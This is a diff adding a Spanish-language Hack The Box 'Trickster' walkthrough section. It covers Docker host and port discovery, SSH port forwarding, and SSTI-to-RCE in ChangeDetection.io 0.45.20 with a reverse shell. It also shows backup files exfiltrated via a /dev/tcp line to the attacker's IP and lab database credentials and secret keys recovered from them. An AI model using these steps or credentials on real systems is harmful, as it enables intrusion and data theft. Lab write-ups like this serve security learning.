@@ -17,9 +17,10 @@ image: https://github.com/user-attachments/assets/68c7e29e-5394-442f-b624-df3200
 * Abusing PrestaShop 8.1.5 XSS to RCE (CVE-2024-34716)
 * Information lekeage
 * Cracking hashes (hashcat)
-* Docker Container Internal Host Discovery (bash script)
-* Docker Container Internal Port Discovery (netcat)
+* Internal Host Discovery Docker Container (bash script)
+* Internal Port Discovery Docker Container (netcat)
 * SSH Local Port Forwarding
+* Abusing STTI to RCE in ChangeDetection v0.45.20
 
 ## Enumeration
 
@@ -457,5 +458,291 @@ james@trickster:~$ whoami
 james
 ```
 
-### Privilege escalation
+Accedo como el usuario james, listando las direcciones IP asignadas a las interfaces de red del sistema, veo que hay una diferente a la de la máquina, la cual es 172.17.0.1
 
+```bash
+james@trickster:~$ hostname -I
+10.10.11.34 172.17.0.1
+```
+
+```bash
+james@trickster:~$ ip addr show docker0
+3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:95:4a:41:58 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+```
+
+Para detectar si existen contenedores desplegados en el sistema ya que no soy root utilizare un pequeño one-liner en bash para detectar los host activos.
+
+```bash
+james@trickster:/tmp$ for i in $(seq 1 254);do timeout 1 bash -c "ping -c 1 172.17.0.$i &>/dev/null && echo 'Host: 172.17.0.$i - ACTIVE'";done
+Host: 172.17.0.1 - ACTIVE
+Host: 172.17.0.2 - ACTIVE
+```
+
+Veo que existe otro host activo a parte de 172.17.0.1 que es 172.17.0.2, por lo que para dichos host utilizaré otro one-liner en bash para detectar puertos abiertos en ambos hosts.
+
+```bash
+james@trickster:/tmp$ for port in $(seq 1 65535);do nc -nvz 172.17.0.1 $port 2>&1 | grep -v refused;done
+Connection to 172.17.0.1 22 port [tcp/*] succeeded!
+Connection to 172.17.0.1 80 port [tcp/*] succeeded!
+```
+
+```bash
+james@trickster:/tmp$ for port in $(seq 1 65535);do nc -nvz 172.17.0.2 $port 2>&1 | grep -v refused;done
+Connection to 172.17.0.2 5000 port [tcp/*] succeeded!
+```
+
+El puerto 5000 del host 172.17.0.2 llama mi atención, realizo un curl para detectar si se trata de un servicio web, pudiendo observar que es así y que se esta redirigiendo a lo que es un panel de login.
+
+```bash
+james@trickster:/tmp$ curl -s -X GET http://172.17.0.2:5000
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/login?next=/">/login?next=/</a>. If not, click the link.
+```
+
+Utilizo ssh para realizar un Local Port Forwarding y traer el puerto 5000 del contenedor al puerto 5000 de mi máquina local.
+
+```bash
+ssh -L 5000:172.17.0.2:5000 james@trickster.htb -fN
+james@trickster.htb's password:
+```
+
+Me dirijo a http://127.0.0.1:5000 pudiendo observar un login de un servicio llamado ChangeDetection.io, ademas en la parte superior derecha consigo observar la versión, la cual es 0.45.20
+
+![imagen](https://github.com/user-attachments/assets/d05c43ab-8bf3-4c7f-a125-7b630cd65126)
+
+> Sabiendo que es ChangeDetection y que la versión es 0.45.20 puedo buscar información sobre posibles vulnerabilidades existentes
+{: .prompt-info }
+
+Una pequeña búsqueda en internet me permite dar con que existe un STTI que deriva en una Ejecución remota de comandos.
+
+* [Server Side Template Injection in Jinja2 allows Remote Command Execution](https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-4r7v-whpg-8rx3)
+
+![imagen](https://github.com/user-attachments/assets/f79f7b1e-ef13-4ec6-b788-c8907c7a09c4)
+
+Necesito estar logueado por lo que busco credenciales por defecto del servicio, pero no encuentro, por ello intento acceder con la contraseña de james, para así comprobar si se realiza reutilización de contraseñas, consigo observar que si accediendo satisfactoriamente al panel de ChangeDetection.
+
+![imagen](https://github.com/user-attachments/assets/bfd1a7d2-d1c6-4430-bd41-eaecdf2f9d0f)
+
+![imagen](https://github.com/user-attachments/assets/9f9d897c-06d4-4514-9313-f520d8f4bd81)
+
+Basicamente en el exploit se indica que el primer paso es crear o editar una URL existente
+
+![imagen](https://github.com/user-attachments/assets/bfd4b147-f9d9-4c5c-a17a-d7360a8cd81f)
+
+Una vez creada hacer clic en editar sobre la misma
+
+![imagen](https://github.com/user-attachments/assets/2c6c27c0-b6cd-44eb-a07d-16b6f8063ef0)
+
+En la primera pestaña modificar a nuestro gusto cada cuanto tiempo se va a comprobar si se han producido cambios en el recurso hacia el que se está apuntando, establezco cada 10 segundos.
+
+![imagen](https://github.com/user-attachments/assets/b65df574-d0f6-4abe-9610-9fb5229415f9)
+
+Ahora me dirijo a la pestaña Notifications y es allí donde debo de indicar en el Notification Body la inyección, por otro lado en notification URL list indicar que quiero recibir la notificación a mi ip port el puerto 1234
+
+![imagen](https://github.com/user-attachments/assets/c445b46f-f874-4fb5-bb13-fef7f7055fd5)
+
+Creo un archivo index.html con contenido y levanto un servidor en Python
+
+```bash
+cat index.html
+satfdxdygcfuhij
+```
+
+```bash
+python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Utilizo netcat para pornerme en escucha por el puerto 1234, por donde se me va a notificar en caso de que se produzca algun cambio en el archivo index.html
+
+```bash
+nc -lvnp 1234
+listening on [any] 1234 ...
+```
+
+Modifico el fichero index.html y al pasar 10 segundos recibo la notificación y al final en el body consigo observar la ejecución del comando id, pudiendo ver que soy root en el contenedor.
+
+```bash
+cat index.html
+dastgfhyujkijhrtgewfwdqtghyjugcfuhij
+```
+
+```bash
+nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.197] from (UNKNOWN) [10.10.11.34] 53758
+GET / HTTP/1.1
+Host: 10.10.14.197:1234
+User-Agent: python-requests/2.31.0
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+Content-Length: 38
+
+uid=0(root) gid=0(root) groups=0(root
+```
+
+Sabiendo esto realizo el mismo, proceso pero en este caso para entablarme una reverse shell port el puerto 1234
+
+![imagen](https://github.com/user-attachments/assets/7446f540-c3f6-4986-8b22-883433e3c4f1)
+
+Inicio un listener con netcat por el puerto 1234, y así obtener la reverse shell
+
+```bash
+nc -lvnp 1234
+listening on [any] 1234 ...
+```
+
+Modifico el index.html
+
+```bash
+cat index.html
+ewdrstfghjj
+```
+
+Tras recibir la solicitud consigo obtener acceso al contenedor como root
+
+```bash
+nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.197] from (UNKNOWN) [10.10.11.34] 48234
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@a4b9a36ae7ff:/app# whoami
+root
+```
+
+Utilizo find para filtrar por archivo de configuración, pero no consigo observar nada de mi interés
+
+```bash
+root@a4b9a36ae7ff:/app# find / -name \*conf\* | grep -vE "etc|sys|usr|var"
+/proc/bootconfig
+/app/changedetectionio/static/favicons/browserconfig.xml
+/app/changedetectionio/tests/visualselector/conftest.py
+/app/changedetectionio/tests/conftest.py
+/app/changedetectionio/tests/restock/conftest.py
+/app/changedetectionio/tests/proxy_list/conftest.py
+/app/changedetectionio/tests/proxy_list/squid-auth.conf
+/app/changedetectionio/tests/proxy_list/squid.conf
+```
+
+Me dirigio al directorio raíz y observo un directorio el cual no es común ver, llamado datastore
+
+```bash
+root@a4b9a36ae7ff:/# ls
+app  bin  boot	datastore  dev	etc  home  lib	lib64  media  mnt  opt	proc  root  run  sbin  srv sys  tmp  usr  var
+```
+
+Dentro del directorio datastore observo un directorio Backups que es lo que principalmente llama mi atención
+
+```bash
+root@a4b9a36ae7ff:/datastore# ls
+Backups b86f1003-3ecb-4125-b090-27e15ca605b9  secret.txt
+url-list.txt a1f2b7b9-bf49-485d-ae61-27a0ebdb5234 bbdd78f6-db98-45eb-9e7b-681a0c60ea34  url-list-with-tags.txt url-watches.json
+```
+
+En el directorio Backups observo dos archivos .zip, los cuales traiga a mi máquina local
+
+```bash
+root@a4b9a36ae7ff:/datastore/Backups# ls
+changedetection-backup-20240830194841.zip  changedetection-backup-20240830202524.zip
+```
+
+```bash
+nc -lvnp 1234 > changedetection-backup-20240830194841.zip
+listening on [any] 1234 ...
+```
+
+```bash
+root@a4b9a36ae7ff:/datastore/Backups# cat < changedetection-backup-20240830194841.zip > /dev/tcp/10.10.14.197/1234
+```
+
+```bash
+nc -lvnp 1234 > changedetection-backup-20240830202524.zip
+listening on [any] 1234 ...
+```
+
+```bash
+root@a4b9a36ae7ff:/datastore/Backups# cat < changedetection-backup-20240830202524.zip > /dev/tcp/10.10.14.197/1234
+```
+
+Descomprimo ambos .zip, en la carpeta llamada b4a8b52d-651b-44bc-bbc6-f9e8c6590103 observo un archivo .txt.br el cual si intento visualizar es ilegible, buscando información observo que un archivo con la extensión .br es un archivo comprimido con el formato Brotli, un algoritmo de compresión desarrollado por Google, Brotli es ampliamente utilizado para comprimir archivos web, como HTML, CSS y JavaScript, para reducir el tamaño de transferencia y mejorar la velocidad de carga. Por lo que con la herramienta brotli en Linux se puede descomprimir el contenido.
+
+```bash
+brotli -d f04f0732f120c0cc84a993ad99decb2c.txt.br
+```
+
+Al visualizar f04f0732f120c0cc84a993ad99decb2c.txt observo credenciales de acceso a la base de datos de un usuario del sistema, el cual es adam.
+
+```bash
+cat f04f0732f120c0cc84a993ad99decb2c.txt
+  This website requires JavaScript.
+    Explore Help
+    Register Sign In
+                james/prestashop
+              Watch 1
+              Star 0
+              Fork 0
+                You've already forked prestashop
+          Code Issues Pull Requests Actions Packages Projects Releases Wiki Activity
+                main
+          prestashop / app / config / parameters.php
+            james 8ee5eaf0bb prestashop
+            2024-08-30 20:35:25 +01:00
+
+              64 lines
+              3.1 KiB
+              PHP
+
+            Raw Permalink Blame History
+
+                < ? php return array (                                                                                                                                 
+                'parameters' =>                                                                                                                                        
+                array (                                                                                                                                                
+                'database_host' => '127.0.0.1' ,                                                                                                                       
+                'database_port' => '' ,                                                                                                                                
+                'database_name' => 'prestashop' ,                                                                                                                      
+                'database_user' => 'adam' ,                                                                                                                            
+                'database_password' => 'adam_admin992' ,                                                                                                               
+                'database_prefix' => 'ps_' ,                                                                                                                           
+                'database_engine' => 'InnoDB' ,                                                                                                                        
+                'mailer_transport' => 'smtp' ,                                                                                                                         
+                'mailer_host' => '127.0.0.1' ,                                                                                                                         
+                'mailer_user' => NULL ,                                                                                                                                
+                'mailer_password' => NULL ,                                                                                                                            
+                'secret' => 'eHPDO7bBZPjXWbv3oSLIpkn5XxPvcvzt7ibaHTgWhTBM3e7S9kbeB1TPemtIgzog' ,                                                                       
+                'ps_caching' => 'CacheMemcache' ,                                                                                                                      
+                'ps_cache_enable' => false ,                                                                                                                           
+                'ps_creation_date' => '2024-05-25' ,                                                                                                                   
+                'locale' => 'en-US' ,                                                                                                                                  
+                'use_debug_toolbar' => true ,                                                                                                                          
+                'cookie_key' => '8PR6s1SCD3cLk5GpvkGAZ4K9hMXpx2h6wfCD3cLk5GpvkGAZ4K9hMXpxBxrf7s42i' ,                                                                  
+                'cookie_iv' => 'fQoIWUoOLU0hiM2VmI1KPY61DtUsUx8g' ,                                                                                                    
+                'new_cookie_key' => 'def000001a30bb7f2f22b0a7790f2268f8c634898e0e1d32444c3a03fbb7f2fb57a73f70e01cf83a38ec5d2ddc1741476e83c45f97f763e7491cc5e002aff47' ,
+                'api_public_key' => '-----BEGIN PUBLIC KEY-----                                                                                                        
+                MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuSFQP3xrZccKbS/VGKMr                                                                                       
+                v8dF4IJh9F9NvmPZqiFNpJnBHhfWE3YVM/OrEREGKztkHFsQGUZXFIwiBQVs5kAG                                                                                       
+                5jfw+hQrl89+JRD0ogZ+OHUfN/CgmM2eq1H/gxAYfcRfwjSlOh2YzAwpLvwtYXBt                                                                                       
+                Scu6QqRAdotokqW2meozijOIJFPFPkpoFKPdVdJ8oslvSt6Kgf39DnBpGIXAqaFc                                                                                       
+                QdMdq+1lT9oiby0exyUkl6aJU21STFZ7kCf0Secp2f9NoaKoBwC9m707C2UCNkAm                                                                                       
+                B2A2wxf88BDC7CtwazwDW9QXdF987RUzGj9UrEWwTwYEcJcV/hNB473bcytaJvY1                                                                                       
+                ZQIDAQAB                                                                                                                                               
+                -----END PUBLIC KEY----- 
+```
+
+Intento acceder mediante ssh con las credenciales, consiguiendo ganar acceso como el usuario adam al sistema.
+
+```bash
+ssh adam@10.10.11.34
+adam@10.10.11.34's password: 
+adam@trickster:~$ whoami
+adam
+```
+
+###
